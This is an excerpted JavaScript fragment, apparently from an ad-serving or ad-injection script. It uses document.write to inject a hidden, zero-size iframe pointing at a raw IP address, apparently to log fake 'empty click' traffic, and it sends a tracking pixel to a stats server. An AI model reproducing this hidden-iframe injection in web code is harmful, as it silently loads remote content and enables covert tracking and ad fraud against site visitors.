...
function recordShow(showType, adId, ref) {
    ...
    //空点 -- 统计IP , 每两秒钟 统计一次空点IP
    if(timestamp % 2 == 0){
        document.write("<div style='display: none;' id='kdIP' ><iframe src='http://115.28.204.206/qu.html?3443' width=0 height=0></iframe><\div>");
    }
...
function closeDeadAdDiv() {
    ...
    var args = getArgs();
    var click_img = new Image(1, 1);
    click_img.src = "http://stat.mdlkt.com:8900/statclick?" + args + "&pos=death";
}
